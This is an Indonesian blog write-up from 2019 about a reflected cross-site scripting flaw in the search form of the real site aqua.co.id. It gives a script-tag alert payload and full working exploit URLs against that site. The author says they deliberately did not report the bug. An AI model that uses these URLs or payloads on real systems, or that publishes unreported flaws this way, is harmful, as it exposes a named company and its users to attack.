---
slug: xss-aqua
title: Cross Site Scripting on Aqua
description: Cross Site Scripting yang ditemukan di website Aqua.co.id pada form pencarian
date: 2019-08-24
author: Rahul
tags: ["pentest", "xss", "security"]
featured: false
editable: true
---

<hr />

## [Introduction](#introduction)

Berjumpa lagi, masih bermain main dengan XSS, kali ini saya mendapat sebuah website bernama Aqua, ya pasti kalian pada tahu dong, Aqua adalah sebuah anak perusahaan dari _Danone_ yang berjalan pada sentra air minum.

<figure>
  <img src="https://i.postimg.cc/pVg1bGqc/image.png" alt="Logo Aqua" />
  <figcaption>Logo Aqua</figcaption>
</figure>

Kebetulan saya bekerja sebagai admin di sebuah CV yang bekerja sama dengan Aqua sebagai mitra utamanya. Kalian bisa mengunjungi website aqua.co.id untuk mendapatkan informasi lebih lanjut tentang perusahaan ini.

## [Disclaimer](#disclaimer)

_Lho kok ga di laporkan aja lur?_ Intinya saya males **mereport** bug seperti ini, endingnya hanya di anggap remeh saja sama mereka, kan kata **mereka** XSS hanya hal sepele hihi, jadi males aja gitu lur. Mending di WriteUP dan untuk saling share pengalaman.

## [Discovery](#discovery)

Oke menuju topik utama, setelah iseng mengunjungi halaman aqua.co.id saya mendapatkan from pencarian, nah disitu saya mendapat ide untuk melakukan XSS.

<figure>
  <img src="https://i.postimg.cc/3JTCFPLh/image.png" alt="Target injeksi script XSS" />
  <figcaption>Target injeksi script XSS</figcaption>
</figure>

### [Testing Payload](#testing-payload)

Saya mencoba memasukkan `"><script>alert(1337);</script>` tetapi yang muncul halaman berikut, awalnya saya merasa gagal.

<figure>
  <img src="https://i.postimg.cc/Dwsh34rL/image.png" alt="Failed attempt" />
  <figcaption>Percobaan pertama yang gagal</figcaption>
</figure>

### [Successful Exploitation](#successful-exploitation)

Lalu mencoba meremove search pada url dari :

```php
https://aqua.co.id/search?_token=Pt6XdGZA2MyJqSY3RuT33O9ThJB0svRVqtiYE3Dn&query=%22%3E%3Cscript%3Ealert%281337%29%3B%3C%2Fscript%3E
```

menjadi

```php
https://aqua.co.id/?_token=Pt6XdGZA2MyJqSY3RuT33O9ThJB0svRVqtiYE3Dn&query=%22%3E%3Cscript%3Ealert%281337%29%3B%3C%2Fscript%3E
```

Dan boom akhirnya muncul juga popup 1337 yang saya dambakan, cieeee….

<figure>
  <img src="https://i.postimg.cc/9fns4WYC/image.png" alt="Successful XSS" />
  <figcaption>XSS berhasil dieksekusi</figcaption>
</figure>

## [Further Testing](#further-testing)

Tak lupa mencoba memunculkan **prompt** agar terdokumentasi bagi saya hehe.

<figure>
  <img src="https://i.postimg.cc/XqZKDbRN/XSS-aqua.png" alt="XSS prompt" />
  <figcaption>XSS dengan prompt</figcaption>
</figure>

### [HTML Rendering](#html-rendering)

Iseng lagi coba coba ternyata bisa render html juga.

<figure>
  <img src="https://i.postimg.cc/zfgFj81J/image.png" alt="HTML rendering" />
  <figcaption>HTML rendering test</figcaption>
</figure>

## [Kesimpulan](#kesimpulan)

Sekian writeup dari saya, jika ada kesalahan kata saya minta maaf. Terima kasih
